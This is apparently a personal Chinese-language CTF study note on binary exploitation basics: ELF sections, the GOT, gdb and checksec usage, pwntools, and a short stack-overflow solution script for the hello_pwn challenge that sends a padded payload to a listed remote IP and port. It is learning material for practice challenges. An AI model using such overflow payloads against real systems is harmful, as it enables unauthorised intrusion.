---
title: PWN
date: 2025-02-07 00:05:38
tags:
  - CTF笔记
  - PWN
---

# PWN

## ELF 文件

ELF 文件中包含多个节 section.

| 名称             | 作用                   |
| ---------------- | ---------------------- |
| `.text`          | 代码                   |
| `.rdata`         | 字符串，不可修改的数据 |
| `.data`          | 已经初始化的可修改数据 |
| `.bss`           | 未被初始化的可修改数据 |
| `.ple` 与 `.got` | 动态链接函数地址       |
|                  |                        |

![1](https://ff-0xff.github.io/2020/04/14/GOT%E8%A1%A8/1.png)

> [GOT表介绍的博客](https://ff-0xff.github.io/2020/04/14/GOT%E8%A1%A8/)

``` shell
gdb a.out
start
vmmap
```

用 vmmap 可以看到内存的表

可以看到内存里有 `libc.so` 这个库

libc 直接运行可以显示出版本

``` shell
./libc-2.23.so
```



## 工具

### Pwntool

#### 返回可交互的界面

``` python
from pwn import *
io = remote('ip',port)
io.interactive()
```

#### checksec 查看文件信息

``` shell
checksec get_shell
```

会显示 

* Arch, 架构
* Stack: No canary 说明没有栈canary
* NX 防护. 如果 NX Enabled 说明堆栈不可执行

### Stack Overflow 栈溢出

栈溢出是向高地址溢出

> 攻防世界 hello_pwn

``` python
from pwn import *
io = remote("61.147.171.105", 53481)
io.sendline(b"a"*4 + p64(0x6E756161))
io.interactive()
```

